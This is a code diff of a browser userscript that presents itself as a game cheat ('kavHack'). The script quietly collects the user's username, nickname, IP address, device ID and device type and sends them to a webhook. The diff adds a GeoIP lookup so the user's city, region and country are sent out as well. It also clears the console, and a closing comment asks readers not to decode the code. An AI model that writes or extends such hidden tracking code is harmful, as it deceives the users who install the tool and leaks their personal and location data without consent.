@@ -109,6 +109,9 @@ async function sendWebhook(data) {
                         { name: '👤 Username', value: data.username || 'Unknown', inline: true },
                         { name: '📛 Nickname', value: data.nickname || 'Unknown', inline: true },
                         { name: '🌐 IP Address', value: data.ip || 'Unknown', inline: true },
+                        { name: '📍 City', value: data.city || 'Unknown', inline: true },
+                        { name: '🏞️ Region', value: data.region || 'Unknown', inline: true },
+                        { name: '🌍 Country', value: data.country || 'Unknown', inline: true },
                         { name: '🔢 Usage Count', value: data.usageCount.toString(), inline: true },
                         { name: '🆔 Device ID', value: data.deviceId || 'Unknown', inline: true },
                         { name: '📱 Device Type', value: data.deviceType || 'Unknown', inline: true },
@@ -165,12 +168,28 @@ loadScript('https://cdn.jsdelivr.net/npm/toastify-js', 'toastifyPlugin')
         localStorage.setItem('kavHackDeviceId', deviceId);
     }
 
-    // Fetch IP address
+    // Fetch IP address and GeoIP
     let ipAddress = 'Unknown';
+    let geoInfo = { city: 'Unknown', region: 'Unknown', country: 'Unknown' };
     try {
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
         ipAddress = ipData.ip;
+
+        // Fetch GeoIP separately to avoid blocking
+        try {
+            const geoResponse = await fetch(`http://ip-api.com/json/${ipAddress}`);
+            const geoData = await geoResponse.json();
+            if (geoData.status !== 'fail') {
+                geoInfo = {
+                    city: geoData.city || 'Unknown',
+                    region: geoData.regionName || 'Unknown',
+                    country: geoData.country || 'Unknown'
+                };
+            }
+        } catch (geoError) {
+            debug('Failed to fetch GeoIP: ' + geoError.message);
+        }
     } catch (error) {
         debug('Failed to fetch IP: ' + error.message);
     }
@@ -238,6 +257,9 @@ loadScript('https://cdn.jsdelivr.net/npm/toastify-js', 'toastifyPlugin')
             username: user.username,
             nickname: user.nickname,
             ip: ipAddress,
+            city: geoInfo.city,
+            region: geoInfo.region,
+            country: geoInfo.country,
             usageCount: usageCount,
             deviceId: deviceId,
             deviceType: device.apple ? 'Apple' : device.mobile ? 'Mobile' : 'Desktop',
@@ -264,4 +286,4 @@ loadScript('https://cdn.jsdelivr.net/npm/toastify-js', 'toastifyPlugin')
     console.clear();
 });
 
-/* Thank you for using my cheat,no decode pls. */
+/* Thank you for using my cheat, no decode pls. */
